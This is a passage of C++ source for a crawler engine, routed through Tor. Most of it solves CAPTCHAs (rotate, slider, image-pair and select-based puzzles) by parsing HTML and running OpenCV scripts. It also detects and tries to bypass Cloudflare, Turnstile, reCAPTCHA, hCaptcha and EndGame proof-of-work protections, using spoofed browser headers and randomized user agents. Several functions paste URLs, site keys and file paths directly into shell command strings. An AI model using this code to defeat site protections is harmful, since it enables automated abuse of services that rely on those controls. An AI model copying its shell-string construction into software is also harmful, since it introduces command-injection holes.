            if (ve == std::string::npos) break;
            optionSymbols.push_back(sel.substr(vs, ve - vs));
            op = ve + 1;
        }
    }

    if (!optionSymbols.empty()) {
        for (const auto& opt : optionSymbols) {
            bool found = false;
            for (const auto& shown : shownSymbols) {
                if (shown == opt) { found = true; break; }
            }
            if (!found) return opt;
        }
    }

    return "";
}

std::string SynapsedEngine::solveMultiStepCaptcha(const std::string& html) const {
    std::vector<std::pair<std::string, std::string>> selects;

    size_t pos = 0;
    while (true) {
        size_t selStart = html.find("<select", pos);
        if (selStart == std::string::npos) break;
        size_t selEnd = html.find("</select>", selStart);
        if (selEnd == std::string::npos) break;
        std::string selBlock = html.substr(selStart, selEnd - selStart);
        pos = selEnd + 9;

        size_t nameP = selBlock.find("name=\"");
        std::string fieldName;
        if (nameP != std::string::npos) {
            nameP += 6;
            size_t nameE = selBlock.find('"', nameP);
            if (nameE != std::string::npos) fieldName = selBlock.substr(nameP, nameE - nameP);
        }

        size_t contextEnd = selStart;
        size_t contextStart = (selStart > 500) ? selStart - 500 : 0;
        std::string context = html.substr(contextStart, contextEnd - contextStart);

        size_t imgTag = context.rfind("<img");
        std::string imgLabel;
        if (imgTag != std::string::npos) {
            size_t altP = context.find("alt=\"", imgTag);
            if (altP != std::string::npos) {
                altP += 5;
                size_t altE = context.find('"', altP);
                if (altE != std::string::npos) imgLabel = context.substr(altP, altE - altP);
            }
            if (imgLabel.empty()) {
                size_t srcP = context.find("src=\"", imgTag);
                if (srcP != std::string::npos) {
                    srcP += 5;
                    size_t srcE = context.find('"', srcP);
                    if (srcE != std::string::npos) {
                        std::string imgPath = downloadCaptchaImage(context.substr(srcP, srcE - srcP));
                        if (!imgPath.empty()) {
                            imgLabel = classifyImage(imgPath);
                            std::remove(imgPath.c_str());
                        }
                    }
                }
            }
        }

        std::string highlightedChar;
        size_t circleP = context.rfind("class=\"highlight");
        if (circleP == std::string::npos) circleP = context.rfind("class=\"active");
        if (circleP == std::string::npos) circleP = context.rfind("class=\"circle");
        if (circleP != std::string::npos) {
            size_t gt = context.find('>', circleP);
            size_t lt = context.find('<', gt + 1);
            if (gt != std::string::npos && lt != std::string::npos)
                highlightedChar = trim(context.substr(gt + 1, lt - gt - 1));
        }

        std::vector<std::pair<std::string, std::string>> options;
        size_t op = 0;
        while (true) {
            size_t optS = selBlock.find("<option", op);
            if (optS == std::string::npos) break;
            size_t valP = selBlock.find("value=\"", optS);
            if (valP == std::string::npos) break;
            valP += 7;
            size_t valE = selBlock.find('"', valP);
            if (valE == std::string::npos) break;
            std::string val = selBlock.substr(valP, valE - valP);
            size_t gt = selBlock.find('>', valE);
            size_t lt = selBlock.find("</option>", gt);
            std::string text;
            if (gt != std::string::npos && lt != std::string::npos)
                text = trim(selBlock.substr(gt + 1, lt - gt - 1));
            options.push_back({val, text});
            op = (lt != std::string::npos) ? lt + 9 : valE + 1;
        }

        std::string chosen;
        if (!imgLabel.empty()) {
            for (const auto& opt : options) {
                std::string lower = opt.second;
                for (auto& ch : lower) ch = std::tolower(ch);
                std::string lowerLabel = imgLabel;
                for (auto& ch : lowerLabel) ch = std::tolower(ch);
                if (lower.find(lowerLabel) != std::string::npos ||
                    lowerLabel.find(lower) != std::string::npos) {
                    chosen = opt.first;
                    break;
                }
            }
        }
        if (chosen.empty() && !highlightedChar.empty()) {
            for (const auto& opt : options) {
                if (opt.second == highlightedChar || opt.first == highlightedChar) {
                    chosen = opt.first;
                    break;
                }
            }
        }
        if (chosen.empty() && !options.empty()) {
            chosen = options[0].first;
        }

        if (!fieldName.empty() && !chosen.empty()) {
            selects.push_back({fieldName, chosen});
        }
    }

    if (selects.empty()) return "";

    std::string combined;
    for (size_t i = 0; i < selects.size(); i++) {
        if (i > 0) combined += "&";
        combined += selects[i].first + "=" + selects[i].second;
    }
    return combined;
}

double SynapsedEngine::detectImageRotation(const std::string& imgPath) const {
    std::string script =
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  import cv2, numpy as np, math;"
        "  img = cv2.imread('" + imgPath + "');"
        "  if img is None: print(0);sys.exit();"
        "  gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY);"
        "  edges = cv2.Canny(gray, 50, 150);"
        "  lines = cv2.HoughLines(edges, 1, np.pi/180, 50);"
        "  if lines is None: print(0);sys.exit();"
        "  angles = [];"
        "  for l in lines:\n"
        "    rho, theta = l[0];"
        "    deg = math.degrees(theta);"
        "    angles.append(deg);"
        "  if not angles: print(0);sys.exit();"
        "  mean_a = sum(angles)/len(angles);"
        "  offset = mean_a - 90.0;"
        "  print(round(-offset, 1));"
        "except: print(0);"
        "\" 2>/dev/null";
    std::string result = trim(execCmd(script));
    if (result.empty()) return 0.0;
    return std::atof(result.c_str());
}

int SynapsedEngine::detectSliderOffset(const std::string& bgPath,
    const std::string& piecePath) const {
    std::string script =
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  import cv2, numpy as np;"
        "  bg = cv2.imread('" + bgPath + "', 0);"
        "  pc = cv2.imread('" + piecePath + "', 0);"
        "  if bg is None or pc is None: print(0);sys.exit();"
        "  res = cv2.matchTemplate(bg, pc, cv2.TM_CCOEFF_NORMED);"
        "  _, _, _, max_loc = cv2.minMaxLoc(res);"
        "  print(max_loc[0]);"
        "except: print(0);"
        "\" 2>/dev/null";
    std::string result = trim(execCmd(script));
    if (result.empty()) return 0;
    return std::atoi(result.c_str());
}

std::string SynapsedEngine::solveRotateCaptcha(const std::string& html) const {
    struct RadioGroup {
        std::string name;
        std::vector<std::pair<std::string, int>> options;
    };
    std::vector<RadioGroup> groups;

    size_t pos = 0;
    while (true) {
        size_t inp = html.find("type=\"radio\"", pos);
        if (inp == std::string::npos) inp = html.find("type='radio'", pos);
        if (inp == std::string::npos) break;

        size_t tagStart = html.rfind('<', inp);
        size_t tagEnd = html.find('>', inp);
        if (tagStart == std::string::npos || tagEnd == std::string::npos) { pos = inp + 12; continue; }
        std::string tag = html.substr(tagStart, tagEnd - tagStart + 1);
        pos = tagEnd + 1;

        bool inCaptchaContext = tag.find("captcha") != std::string::npos ||
            tag.find("rotate") != std::string::npos ||
            tag.find("answer") != std::string::npos ||
            tag.find("anC_") != std::string::npos;
        if (!inCaptchaContext) {
            size_t formCtx = html.rfind("<form", tagStart);
            size_t divCtx = html.rfind("ancaptcha", tagStart);
            size_t divCtx2 = html.rfind("anCaptcha", tagStart);
            size_t divCtx3 = html.rfind("decaptcha", tagStart);
            size_t divCtx4 = html.rfind("ddos_form", tagStart);
            if ((formCtx == std::string::npos || tagStart - formCtx > 5000) &&
                (divCtx == std::string::npos || tagStart - divCtx > 5000) &&
                (divCtx2 == std::string::npos || tagStart - divCtx2 > 5000) &&
                (divCtx3 == std::string::npos || tagStart - divCtx3 > 5000) &&
                (divCtx4 == std::string::npos || tagStart - divCtx4 > 5000))
                continue;
        }

        std::string name, val;
        size_t nP = tag.find("name=\"");
        if (nP == std::string::npos) nP = tag.find("name='");
        if (nP != std::string::npos) {
            char q = tag[nP + 5];
            nP += 6;
            size_t nE = tag.find(q, nP);
            if (nE != std::string::npos) name = tag.substr(nP, nE - nP);
        }
        size_t vP = tag.find("value=\"");
        if (vP == std::string::npos) vP = tag.find("value='");
        if (vP != std::string::npos) {
            char q = tag[vP + 6];
            vP += 7;
            size_t vE = tag.find(q, vP);
            if (vE != std::string::npos) val = tag.substr(vP, vE - vP);
        }
        if (name.empty() || val.empty()) continue;

        std::string radioId;
        size_t idP = tag.find("id=\"");
        if (idP == std::string::npos) idP = tag.find("id='");
        if (idP != std::string::npos) {
            char q = tag[idP + 3];
            idP += 4;
            size_t idE = tag.find(q, idP);
            if (idE != std::string::npos) radioId = tag.substr(idP, idE - idP);
        }

        int degree = -1;
        if (!radioId.empty()) {
            std::string cssSelector = "#" + radioId + ":checked";
            size_t cssP = html.find(cssSelector);
            while (cssP != std::string::npos) {
                size_t rotP = html.find("rotate(", cssP);
                if (rotP != std::string::npos && rotP < cssP + 300) {
                    rotP += 7;
                    size_t rotE = html.find("deg", rotP);
                    if (rotE == std::string::npos) rotE = html.find(")", rotP);
                    if (rotE != std::string::npos) {
                        degree = std::atoi(html.substr(rotP, rotE - rotP).c_str());
                        break;
                    }
                }
                cssP = html.find(cssSelector, cssP + 1);
            }
        }
        if (degree < 0) {
            std::string searchVal = "value=\"" + val + "\"";
            size_t cssP = html.find(searchVal);
            while (cssP != std::string::npos) {
                size_t rotP = html.find("rotate(", cssP);
                if (rotP != std::string::npos && rotP < cssP + 300) {
                    rotP += 7;
                    size_t rotE = html.find("deg", rotP);
                    if (rotE == std::string::npos) rotE = html.find(")", rotP);
                    if (rotE != std::string::npos) {
                        degree = std::atoi(html.substr(rotP, rotE - rotP).c_str());
                        break;
                    }
                }
                cssP = html.find(searchVal, cssP + 1);
            }
            if (degree < 0) degree = 0;
        }

        bool found = false;
        for (auto& g : groups) {
            if (g.name == name) { g.options.push_back({val, degree}); found = true; break; }
        }
        if (!found) groups.push_back({name, {{val, degree}}});
    }

    std::string tokenField, tokenName;
    for (const auto& tok : {"ancaptcha_token", "_token", "token", "captcha_token"}) {
        std::string search = std::string("name=\"") + tok + "\"";
        size_t tokP = html.find(search);
        if (tokP != std::string::npos) {
            size_t valP = html.find("value=\"", tokP);
            if (valP != std::string::npos && valP < tokP + 300) {
                valP += 7;
                size_t valE = html.find('"', valP);
                if (valE != std::string::npos) { tokenField = html.substr(valP, valE - valP); tokenName = tok; break; }
            }
        }
    }
    if (tokenField.empty() && html.find("anC_") != std::string::npos) {
        size_t hp = html.find("type=\"hidden\"");
        while (hp != std::string::npos) {
            size_t ts = html.rfind('<', hp);
            size_t te = html.find('>', hp);
            if (ts != std::string::npos && te != std::string::npos) {
                std::string htag = html.substr(ts, te - ts + 1);
                if (htag.find("anC_") != std::string::npos) {
                    size_t hnp = htag.find("name=\"");
                    size_t hvp = htag.find("value=\"");
                    if (hnp != std::string::npos && hvp != std::string::npos) {
                        hnp += 6; size_t hne = htag.find('"', hnp);
                        hvp += 7; size_t hve = htag.find('"', hvp);
                        if (hne != std::string::npos && hve != std::string::npos) {
                            tokenName = htag.substr(hnp, hne - hnp);
                            tokenField = htag.substr(hvp, hve - hvp);
                            break;
                        }
                    }
                }
            }
            hp = html.find("type=\"hidden\"", hp + 13);
        }
    }

    std::string result;
    for (const auto& g : groups) {
        std::string bestVal;
        int bestDist = 9999;
        for (const auto& opt : g.options) {
            int dist = ((opt.second % 360) + 360) % 360;
            if (dist > 180) dist = 360 - dist;
            if (dist < bestDist) { bestDist = dist; bestVal = opt.first; }
        }
        if (!bestVal.empty()) {
            if (!result.empty()) result += "&";
            result += g.name + "=" + bestVal;
        }
    }

    if (result.empty()) {
        std::vector<std::string> imgUrls;
        size_t ip = 0;
        while (imgUrls.size() < 5) {
            size_t imgTag = html.find("<img", ip);
            if (imgTag == std::string::npos) break;
            size_t tagEnd = html.find('>', imgTag);
            if (tagEnd == std::string::npos) break;
            std::string tag = html.substr(imgTag, tagEnd - imgTag + 1);
            ip = tagEnd + 1;
            if (tag.find("captcha") == std::string::npos &&
                tag.find("rotate") == std::string::npos &&
                tag.find("data:image") == std::string::npos) continue;
            size_t srcP = tag.find("src=\"");
            if (srcP == std::string::npos) continue;
            srcP += 5;
            size_t srcE = tag.find('"', srcP);
            if (srcE == std::string::npos) continue;
            imgUrls.push_back(tag.substr(srcP, srcE - srcP));
        }
        for (size_t i = 0; i < imgUrls.size(); i++) {
            std::string path = downloadCaptchaImage(imgUrls[i]);
            if (path.empty()) continue;
            double angle = detectImageRotation(path);
            std::remove(path.c_str());
            int correction = ((int)(-angle) % 360 + 360) % 360;
            if (!result.empty()) result += "&";
            result += "rotate_" + std::to_string(i) + "=" + std::to_string(correction);
        }
    }

    if (!tokenField.empty()) {
        std::string tn = tokenName.empty() ? "ancaptcha_token" : tokenName;
        result = (result.empty() ? "" : "&") + result;
        result = tn + "=" + tokenField + result;
    }

    std::string formAction;
    size_t formP = html.find("class=\"ddos_form\"");
    if (formP == std::string::npos) formP = html.find("captcha");
    if (formP != std::string::npos) {
        size_t actP = html.rfind("action=\"", formP);
        if (actP != std::string::npos && formP - actP < 500) {
            actP += 8;
            size_t actE = html.find('"', actP);
            if (actE != std::string::npos) formAction = html.substr(actP, actE - actP);
        }
    }

    return result;
}

std::string SynapsedEngine::solveSliderCaptcha(const std::string& html) const {
    struct RadioGroup {
        std::string name;
        std::vector<std::pair<std::string, int>> options;
    };
    std::vector<RadioGroup> groups;
    size_t pos = 0;
    while (true) {
        size_t inp = html.find("type=\"radio\"", pos);
        if (inp == std::string::npos) inp = html.find("type='radio'", pos);
        if (inp == std::string::npos) break;
        size_t tagStart = html.rfind('<', inp);
        size_t tagEnd = html.find('>', inp);
        if (tagStart == std::string::npos || tagEnd == std::string::npos) { pos = inp + 12; continue; }
        std::string tag = html.substr(tagStart, tagEnd - tagStart + 1);
        pos = tagEnd + 1;
        if (tag.find("slider") == std::string::npos &&
            tag.find("captcha") == std::string::npos &&
            tag.find("slide") == std::string::npos) continue;
        std::string name, val;
        size_t nP = tag.find("name=\""); if (nP == std::string::npos) nP = tag.find("name='");
        if (nP != std::string::npos) { char q = tag[nP+5]; nP += 6; size_t nE = tag.find(q, nP); if (nE != std::string::npos) name = tag.substr(nP, nE-nP); }
        size_t vP = tag.find("value=\""); if (vP == std::string::npos) vP = tag.find("value='");
        if (vP != std::string::npos) { char q = tag[vP+6]; vP += 7; size_t vE = tag.find(q, vP); if (vE != std::string::npos) val = tag.substr(vP, vE-vP); }
        if (name.empty() || val.empty()) continue;
        int tx = 0;
        std::string sv = "value=\"" + val + "\"";
        size_t cp = html.find(sv);
        while (cp != std::string::npos) {
            size_t tp = html.find("translateX(", cp);
            if (tp == std::string::npos) tp = html.find("translate(", cp);
            if (tp != std::string::npos && tp < cp + 300) {
                size_t np = tp + (html[tp+9] == 'X' ? 11 : 10);
                size_t ne = html.find("px", np);
                if (ne == std::string::npos) ne = html.find(")", np);
                if (ne != std::string::npos) { tx = std::atoi(html.substr(np, ne - np).c_str()); break; }
            }
            cp = html.find(sv, cp + 1);
        }
        bool found = false;
        for (auto& g : groups) { if (g.name == name) { g.options.push_back({val, tx}); found = true; break; } }
        if (!found) groups.push_back({name, {{val, tx}}});
    }

    std::string tokenField;
    for (const auto& tok : {"ancaptcha_token", "_token", "token", "captcha_token"}) {
        std::string search = std::string("name=\"") + tok + "\"";
        size_t tokP = html.find(search);
        if (tokP != std::string::npos) {
            size_t valP = html.find("value=\"", tokP);
            if (valP != std::string::npos && valP < tokP + 300) {
                valP += 7; size_t valE = html.find('"', valP);
                if (valE != std::string::npos) { tokenField = html.substr(valP, valE - valP); break; }
            }
        }
    }

    if (!groups.empty()) {
        std::string result;
        for (const auto& g : groups) {
            std::string bestVal; int bestDist = 99999;
            for (const auto& opt : g.options) {
                int dist = std::abs(opt.second);
                if (dist < bestDist) { bestDist = dist; bestVal = opt.first; }
            }
            if (!bestVal.empty()) { if (!result.empty()) result += "&"; result += g.name + "=" + bestVal; }
        }
        if (!tokenField.empty()) result = "ancaptcha_token=" + tokenField + "&" + result;
        return result;
    }

    std::string bgUrl, pieceUrl;
    pos = 0;
    while (true) {
        size_t imgTag = html.find("<img", pos);
        if (imgTag == std::string::npos) break;
        size_t tagEnd = html.find('>', imgTag);
        if (tagEnd == std::string::npos) break;
        std::string tag = html.substr(imgTag, tagEnd - imgTag + 1);
        pos = tagEnd + 1;
        size_t srcP = tag.find("src=\""); if (srcP == std::string::npos) continue;
        srcP += 5; size_t srcE = tag.find('"', srcP); if (srcE == std::string::npos) continue;
        std::string src = tag.substr(srcP, srcE - srcP);
        if (tag.find("background") != std::string::npos || tag.find("slider-bg") != std::string::npos)
            bgUrl = src;
        else if (tag.find("piece") != std::string::npos || tag.find("puzzle") != std::string::npos)
            pieceUrl = src;
        else if (bgUrl.empty()) bgUrl = src;
        else if (pieceUrl.empty()) pieceUrl = src;
    }
    if (bgUrl.empty()) return "";
    std::string bgPath = downloadCaptchaImage(bgUrl);
    std::string piecePath;
    if (!pieceUrl.empty()) piecePath = downloadCaptchaImage(pieceUrl);
    int offset = 0;
    if (!piecePath.empty() && !bgPath.empty()) {
        offset = detectSliderOffset(bgPath, piecePath);
        std::remove(piecePath.c_str());
    } else if (!bgPath.empty()) {
        std::string script = "python3 -c \""
            "import sys;"
            "try:\n"
            "  import cv2, numpy as np;"
            "  img = cv2.imread('" + bgPath + "', 0);"
            "  if img is None: print(0);sys.exit();"
            "  edges = cv2.Canny(img, 100, 200);"
            "  contours, _ = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE);"
            "  if not contours: print(0);sys.exit();"
            "  best = max(contours, key=cv2.contourArea);"
            "  x, y, w, h = cv2.boundingRect(best);"
            "  print(x);"
            "except: print(0);"
            "\" 2>/dev/null";
        offset = std::atoi(trim(execCmd(script)).c_str());
    }
    if (!bgPath.empty()) std::remove(bgPath.c_str());
    std::string result = "slider_0=" + std::to_string(offset);
    if (!tokenField.empty()) result = "ancaptcha_token=" + tokenField + "&" + result;
    return result;
}

std::string SynapsedEngine::solvePairCaptcha(const std::string& html) const {
    std::vector<std::pair<std::string, std::string>> images;
    size_t pos = 0;
    while (images.size() < 20) {
        size_t imgTag = html.find("<img", pos);
        if (imgTag == std::string::npos) break;
        size_t tagEnd = html.find('>', imgTag);
        if (tagEnd == std::string::npos) break;
        std::string tag = html.substr(imgTag, tagEnd - imgTag + 1);
        pos = tagEnd + 1;

        size_t srcP = tag.find("src=\"");
        if (srcP == std::string::npos) continue;
        srcP += 5;
        size_t srcE = tag.find('"', srcP);
        if (srcE == std::string::npos) continue;
        std::string src = tag.substr(srcP, srcE - srcP);

        std::string id;
        size_t idP = tag.find("data-id=\"");
        if (idP == std::string::npos) idP = tag.find("data-value=\"");
        if (idP == std::string::npos) idP = tag.find("name=\"");
        if (idP != std::string::npos) {
            size_t q = tag.find('"', idP + 5);
            size_t q2 = tag.find('"', q + 1);
            if (q != std::string::npos && q2 != std::string::npos)
                id = tag.substr(q + 1, q2 - q - 1);
        }
        if (id.empty()) id = std::to_string(images.size());
        images.push_back({src, id});
    }

    if (images.size() < 4) return "";

    struct ImgHash { std::string id; std::string hash; };
    std::vector<ImgHash> hashes;
    for (const auto& img : images) {
        std::string path = downloadCaptchaImage(img.first);
        if (path.empty()) { hashes.push_back({img.second, "fail"}); continue; }

        std::string phash = execCmd(
            "python3 -c \""
            "import sys;"
            "try:\n"
            "  import cv2, numpy as np;"
            "  img = cv2.imread('" + path + "');"
            "  if img is None: print('fail');sys.exit();"
            "  small = cv2.resize(img, (8, 8));"
            "  gray = cv2.cvtColor(small, cv2.COLOR_BGR2GRAY);"
            "  avg = gray.mean();"
            "  bits = (gray > avg).flatten();"
            "  h = 0;"
            "  for b in bits: h = (h << 1) | int(b);"
            "  print(hex(h));"
            "except: print('fail');"
            "\" 2>/dev/null");
        std::remove(path.c_str());
        hashes.push_back({img.second, trim(phash)});
    }

    std::vector<std::pair<std::string, std::string>> pairs;
    std::vector<bool> used(hashes.size(), false);
    for (size_t i = 0; i < hashes.size(); i++) {
        if (used[i] || hashes[i].hash == "fail") continue;
        for (size_t j = i + 1; j < hashes.size(); j++) {
            if (used[j] || hashes[j].hash == "fail") continue;
            if (hashes[i].hash == hashes[j].hash) {
                pairs.push_back({hashes[i].id, hashes[j].id});
                used[i] = used[j] = true;
                break;
            }
        }
    }

    if (pairs.empty()) {
        for (size_t i = 0; i < hashes.size() && pairs.empty(); i++) {
            if (used[i] || hashes[i].hash == "fail") continue;
            uint64_t h1 = std::strtoull(hashes[i].hash.c_str(), nullptr, 16);
            int bestDist = 999;
            size_t bestJ = 0;
            for (size_t j = i + 1; j < hashes.size(); j++) {
                if (used[j] || hashes[j].hash == "fail") continue;
                uint64_t h2 = std::strtoull(hashes[j].hash.c_str(), nullptr, 16);
                uint64_t diff = h1 ^ h2;
                int dist = 0;
                while (diff) { dist += diff & 1; diff >>= 1; }
                if (dist < bestDist) { bestDist = dist; bestJ = j; }
            }
            if (bestDist < 10) {
                pairs.push_back({hashes[i].id, hashes[bestJ].id});
                used[i] = used[bestJ] = true;
            }
        }
    }

    if (pairs.empty()) return "";

    std::string tokenField;
    size_t tokP = html.find("name=\"ancaptcha_token\"");
    if (tokP == std::string::npos) tokP = html.find("name=\"token\"");
    if (tokP != std::string::npos) {
        size_t valP = html.find("value=\"", tokP);
        if (valP != std::string::npos && valP < tokP + 200) {
            valP += 7;
            size_t valE = html.find('"', valP);
            if (valE != std::string::npos) tokenField = html.substr(valP, valE - valP);
        }
    }

    std::string result;
    if (!tokenField.empty()) result = "ancaptcha_token=" + tokenField;
    for (size_t i = 0; i < pairs.size(); i++) {
        if (!result.empty()) result += "&";
        result += "pair_" + std::to_string(i) + "_0=" + pairs[i].first +
                  "&pair_" + std::to_string(i) + "_1=" + pairs[i].second;
    }
    return result;
}

std::string SynapsedEngine::randomUserAgent() const {
    static const char* agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    };
    std::mt19937 g(std::random_device{}());
    return agents[g() % 8];
}

SynapsedEngine::ClearnetBypass SynapsedEngine::detectClearnetProtection(
    const std::string& html, int httpCode) const {
    ClearnetBypass b;

    if (httpCode == 403 || httpCode == 429) b.rateLimit = true;

    if (html.find("cf-browser-verification") != std::string::npos ||
        html.find("cf_clearance") != std::string::npos ||
        html.find("Checking your browser") != std::string::npos ||
        html.find("cf-challenge") != std::string::npos ||
        html.find("_cf_chl") != std::string::npos) {
        b.cloudflare = true;
    }

    if (html.find("challenges.cloudflare.com/turnstile") != std::string::npos ||
        html.find("cf-turnstile") != std::string::npos) {
        b.turnstile = true;
        b.cloudflare = true;
    }

    if (html.find("google.com/recaptcha") != std::string::npos ||
        html.find("g-recaptcha") != std::string::npos ||
        html.find("recaptcha/api") != std::string::npos) {
        b.recaptcha = true;
        size_t sk = html.find("data-sitekey=\"");
        if (sk != std::string::npos) {
            sk += 14;
            size_t se = html.find('"', sk);
            if (se != std::string::npos) b.siteKey = html.substr(sk, se - sk);
        }
    }

    if (html.find("hcaptcha.com") != std::string::npos ||
        html.find("h-captcha") != std::string::npos) {
        b.hcaptcha = true;
        size_t sk = html.find("data-sitekey=\"");
        if (sk != std::string::npos) {
            sk += 14;
            size_t se = html.find('"', sk);
            if (se != std::string::npos) b.siteKey = html.substr(sk, se - sk);
        }
    }

    return b;
}

std::string SynapsedEngine::fetchClearnet(const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    std::string ua = randomUserAgent();
    std::string cookieJar = "" + dataDir_ + "/clearnet_cookies.txt";
    // Still SOCKS even on the "clearnet" helper — destination may be HTTPS, transport is Tor.
    std::string cmd = "curl -s --max-time 30 " + socks5Arg() + " -L "
        "-H \"User-Agent: " + ua + "\" "
        "-H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" "
        "-H \"Accept-Language: en-US,en;q=0.9\" "
        "-H \"Accept-Encoding: gzip, deflate, br\" "
        "-H \"Connection: keep-alive\" "
        "-H \"Upgrade-Insecure-Requests: 1\" "
        "-H \"Sec-Fetch-Dest: document\" "
        "-H \"Sec-Fetch-Mode: navigate\" "
        "-H \"Sec-Fetch-Site: none\" "
        "-H \"Sec-Fetch-User: ?1\" "
        "--compressed "
        "-c " + cookieJar + " -b " + cookieJar + " "
        "-w \"\\n__HTTP_CODE__%{http_code}\" "
        "\"" + url + "\" 2>/dev/null";
    return execCmd(cmd);
}

std::string SynapsedEngine::bypassCloudflareChallenge(const std::string& url) const {
    if (!isUrlSafe(url)) return "";

    std::string script =
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  from subprocess import run, PIPE;"
        "  import time, json;"
        "  r = run(['curl-impersonate-chrome', '-s', '-L', '--max-time', '30',"
        "    '-c', '" + dataDir_ + "/cf_cookies.txt',"
        "    '-b', '" + dataDir_ + "/cf_cookies.txt',"
        "    '" + url + "'], capture_output=True, text=True, timeout=35);"
        "  if r.returncode == 0 and len(r.stdout) > 100:"
        "    print(r.stdout);"
        "  else:"
        "    r2 = run(['curl', '-s', '-L', '--max-time', '30',"
        "      '-H', 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',"
        "      '-c', '" + dataDir_ + "/cf_cookies.txt',"
        "      '-b', '" + dataDir_ + "/cf_cookies.txt',"
        "      '" + url + "'], capture_output=True, text=True, timeout=35);"
        "    print(r2.stdout);"
        "except Exception as e: print('');"
        "\" 2>/dev/null";
    std::string result = execCmd(script);
    if (result.size() < 100) return "";
    return result;
}

std::string SynapsedEngine::solveRecaptchaAudio(const std::string& siteKey,
    const std::string& pageUrl) const {
    if (siteKey.empty() || pageUrl.empty()) return "";

    std::string script =
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  import requests, base64, json, speech_recognition as sr;"
        "  from io import BytesIO;"
        "  import urllib.request;"
        "  api = 'https://www.google.com/recaptcha/api2';"
        "  s = requests.Session();"
        "  s.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0.0.0';"
        "  r = s.get(f'{api}/anchor?ar=1&k=" + siteKey + "&co=aHR0cHM6Ly9leGFtcGxlLmNvbQ..&hl=en&v=jF0kMEbCnEo&size=normal');"
        "  import re;"
        "  tok = re.search(r'recaptcha-token.*?value=\"(.*?)\"', r.text);"
        "  if not tok: print('');sys.exit();"
        "  token = tok.group(1);"
        "  r2 = s.post(f'{api}/reload?k=" + siteKey + "', data={'v':'jF0kMEbCnEo','reason':'q','c':token,'k':'" + siteKey + "','co':'aHR0cHM6Ly9leGFtcGxlLmNvbQ..','hl':'en','size':'normal','chr':'','vh':'','bg':''});"
        "  aud = re.search(r'rresp\",\"(.*?)\"', r2.text);"
        "  if not aud: r3 = s.post(f'{api}/reload?k=" + siteKey + "', data={'v':'jF0kMEbCnEo','reason':'a','c':token,'k':'" + siteKey + "','co':'aHR0cHM6Ly9leGFtcGxlLmNvbQ..','hl':'en','size':'normal'}); aud = re.search(r'rresp\",\"(.*?)\"', r3.text);"
        "  if aud: print(aud.group(1));"
        "  else: print('');"
        "except: print('');"
        "\" 2>/dev/null";
    return trim(execCmd(script));
}

std::string SynapsedEngine::solveHCaptcha(const std::string& siteKey,
    const std::string& pageUrl) const {
    if (siteKey.empty()) return "";

    std::string script =
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  import requests, json;"
        "  s = requests.Session();"
        "  s.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0.0.0';"
        "  r = s.post('https://hcaptcha.com/checksiteconfig', json={'host':'" + pageUrl + "','sitekey':'" + siteKey + "','sc':1,'swa':1});"
        "  d = r.json();"
        "  if d.get('pass'): print('bypass');sys.exit();"
        "  r2 = s.post('https://hcaptcha.com/getcaptcha/' + '" + siteKey + "', json={'host':'" + pageUrl + "','sitekey':'" + siteKey + "','motionData':'{}'});"
        "  d2 = r2.json();"
        "  if 'generated_pass_UUID' in d2: print(d2['generated_pass_UUID']);"
        "  else: print('');"
        "except: print('');"
        "\" 2>/dev/null";
    return trim(execCmd(script));
}

SynapsedEngine::EndGameV3Challenge SynapsedEngine::detectEndGameV3(
    const std::string& html, const std::string& baseUrl) const {
    EndGameV3Challenge ch;

    bool hasPoW = html.find("proof-of-work") != std::string::npos ||
        html.find("proof_of_work") != std::string::npos ||
        html.find("hashcash") != std::string::npos ||
        html.find("pow_challenge") != std::string::npos ||
        html.find("endgame_pow") != std::string::npos ||
        html.find("work_challenge") != std::string::npos ||
        (html.find("challenge") != std::string::npos &&
         html.find("nonce") != std::string::npos &&
         html.find("difficulty") != std::string::npos);

    if (!hasPoW) return ch;

    ch.detected = true;

    for (const auto& pat : {"data-challenge=\"", "challenge=\"",
        "\"challenge\":\"", "name=\"challenge\" value=\"",
        "id=\"challenge\" value=\"", "pow_challenge=\""}) {
        size_t p = html.find(pat);
        if (p != std::string::npos) {
            p += strlen(pat);
            size_t e = html.find('"', p);
            if (e == std::string::npos) e = html.find('\'', p);
            if (e != std::string::npos && e - p < 128) {
                ch.challenge = html.substr(p, e - p);
                break;
            }
        }
    }

    if (ch.challenge.empty()) {
        size_t jsChall = html.find("challenge");
        if (jsChall != std::string::npos) {
            size_t colon = html.find_first_of(":=", jsChall + 9);
            if (colon != std::string::npos && colon < jsChall + 30) {
                size_t qs = html.find_first_of("\"'", colon + 1);
                if (qs != std::string::npos && qs < colon + 10) {
                    size_t qe = html.find(html[qs], qs + 1);
                    if (qe != std::string::npos && qe - qs < 128)
                        ch.challenge = html.substr(qs + 1, qe - qs - 1);
                }
            }
